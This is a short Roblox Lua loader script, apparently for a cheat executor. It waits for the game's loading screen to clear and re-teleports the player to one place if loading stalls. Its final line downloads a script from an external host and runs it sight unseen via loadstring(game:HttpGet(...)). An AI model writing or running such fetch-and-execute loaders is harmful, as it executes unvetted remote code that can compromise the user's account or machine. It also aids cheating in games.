local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
local PLACE_ID = 3260590327
local TIMEOUT = 60

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local function IsLoading()
    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    local loadingScreen = playerGui and playerGui:FindFirstChild("LoadingScreen")
    local content = loadingScreen and loadingScreen:FindFirstChild("content")

    return
        LocalPlayer:GetAttribute("Loading") == true
        or LocalPlayer:GetAttribute("Teleporting") == true
        or (content and content.Visible == true)
end

local startedAt = os.clock()

while IsLoading() do
    if os.clock() - startedAt >= TIMEOUT then
        pcall(function()
            TeleportService:Teleport(PLACE_ID, LocalPlayer)
        end)

        return
    end

    task.wait(1)
end

loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/b6f94e11cee9f4f5d02f2d41490f2370afdbed8b345834b3b383decb2c386acc/download"))()
